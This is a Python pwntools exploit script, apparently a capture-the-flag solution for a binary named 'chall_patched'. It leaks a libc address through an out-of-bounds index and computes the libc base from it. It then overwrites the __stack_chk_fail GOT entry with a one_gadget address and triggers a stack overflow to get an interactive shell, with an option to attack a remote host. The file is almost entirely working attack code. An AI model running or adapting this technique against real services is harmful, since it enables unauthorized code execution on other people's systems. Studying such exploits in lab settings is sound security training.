#!/usr/bin/env python3
from pwn import *

exe = './chall_patched'

elf = context.binary = ELF(exe)
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())



### helper ###


#### Exploit starts here ####

io = start()

libc = ELF('libc.so.6')

io.sendlineafter(b'>>',b'-17')
addr = int(io.recvline().split()[1].decode(),16)


log.info(f'puts @ {hex(addr)}')

libc.address = addr - libc.sym['puts']
log.info(f'base @ {hex(libc.address)}')
libc_base = libc.address

ogs = [0xe3afe,0xe3b01,0xe3b04]

og = libc_base+ogs[1]

fail = elf.got['__stack_chk_fail']


io.sendline(hex(fail).encode())

io.sendline(str(og).encode())

io.sendline(b'50')
payload = b'A'*200
io.sendline(payload)


io.interactive()
